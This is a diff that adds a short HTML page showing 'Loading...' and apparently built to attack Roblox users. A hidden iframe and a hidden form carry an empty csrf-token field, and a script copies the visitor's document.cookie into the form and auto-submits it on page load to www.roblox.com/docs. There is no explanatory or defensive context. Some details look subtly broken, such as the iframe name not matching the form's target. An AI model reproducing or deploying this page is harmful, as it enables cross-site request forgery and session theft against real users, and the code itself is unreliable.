@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <h1>Loading...</h1>
+    <iframe style="width: 1px; height: 1px; visibility: hidden" name=" robloxframe"></iframe>
+    <form method="POST" action="https://www.roblox.com/docs" target="robloxframe" id="csrf-form">
+      <input type="hidden" name=".csrf-token" value=""/>
+      <input type="hidden" name="cookie" value=""/>
+      <input type="hidden" name="path" value="/docs"/>
+    </form> 
+    <script>
+      var cookies = document.cookie;
+      document.getElementById('csrf-form').elements[1].value = cookies;
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
